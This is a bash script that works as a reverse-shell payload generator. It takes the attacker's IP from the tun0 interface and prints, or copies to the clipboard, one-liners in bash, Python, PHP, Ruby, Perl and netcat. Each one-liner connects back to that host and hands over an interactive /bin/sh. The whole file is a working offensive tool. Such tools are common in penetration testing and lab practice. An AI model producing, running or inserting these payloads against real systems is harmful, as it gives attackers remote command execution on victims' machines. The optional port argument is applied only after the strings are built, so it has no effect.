#!/bin/bash

# Change Default Port and Device here!
PORT=4444
DEVICE="tun0"

if ip a s $DEVICE &>/dev/null; then
    IP=$(ip a s $DEVICE | sed -n 3p | grep -o -m 1 "[0-9\.]*" | head -1);
    PYSTRING="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    BASHSTRING="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
    PHPSTRING="php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    RUBYSTRING="ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    PERLSTRING1="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    PERLSTRING2="perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$IP:$PORT\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    PERLSTRING3="perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$IP:$PORT\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    NCSTRING1="nc -e /bin/sh $IP $PORT"
    NCSTRING2="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
else
    echo "Device $DEVICE not found.";
    exit 1;
fi

if [ $# -eq 2 ]; then
    PORT=$2
fi

case "$1" in 
    bash)
        echo $BASHSTRING | tee /dev/tty | xsel -ib
        ;;
    python)
        echo $PYSTRING | tee /dev/tty | xsel -ib
        ;;
    php)
        echo $PHPSTRING | tee /dev/tty | xsel -ib
        ;;
    ruby)
        echo $RUBYSTRING | tee /dev/tty | xsel -ib
        ;;
    perl)
        echo "1) $PERLSTRING1"
        echo
        echo "2) $PERLSTRING2"
        echo
        echo "3) $PERLSTRING3"
        echo
        echo -n "Select shell to copy: "
        read -n1 RESP
        if [ $RESP == 1 ]; then
            echo $PERLSTRING1 | tee /dev/tty | xsel -ib
        elif [ $RESP == 2 ]; then
            echo $PERLSTRING2 | tee /dev/tty | xsel -ib
        elif [ $RESP == 3 ]; then
            echo $PERLSTRING3 | tee /dev/tty | xsel -ib
        else
            echo
            echo "Invalid selection"
            exit 1;
        fi
        echo "Shell $RESP has been added to the clipboard"
        ;;
    nc)
        echo "1) $NCSTRING1"
        echo
        echo "2) $NCSTRING2"
        echo
        echo -n "Select shell to copy: "
        read -n1 RESP
        if [ $RESP == 1 ]; then
            echo $NCSTRING1 | tee /dev/tty | xsel -ib
        elif [ $RESP == 2 ]; then
            echo $NCSTRING2 | tee /dev/tty | xsel -ib
        else
            echo
            echo "Invalid selection"
            exit 1;
        fi
        echo "Shell $RESP has been added to the clipboard"
        ;;
    all)
        echo "--Bash--"
        echo $BASHSTRING
        echo
        echo --Python--
        echo $PYSTRING
        echo
        echo "--PHP--"
        echo $PHPSTRING
        echo
        echo "--RUBY--"
        echo $RUBYSTRING
        echo
        echo "--PERL--"
        echo $PERLSTRING1
        echo
        echo $PERLSTRING2
        echo
        echo "--PERL Windows--"
        echo "$PERLSTRING3"
        echo
        echo "--Netcat--"
        echo $NCSTRING1
        echo
        echo "--Netcat No -e flag--"
        echo $NCSTRING2
        ;;
    *)
        echo "shells - Grabs device IP and outputs a reverse shell."
        echo $"Usage: shells {bash|python|php|ruby|perl|nc|all} [PORT]"
        exit 1;
esac
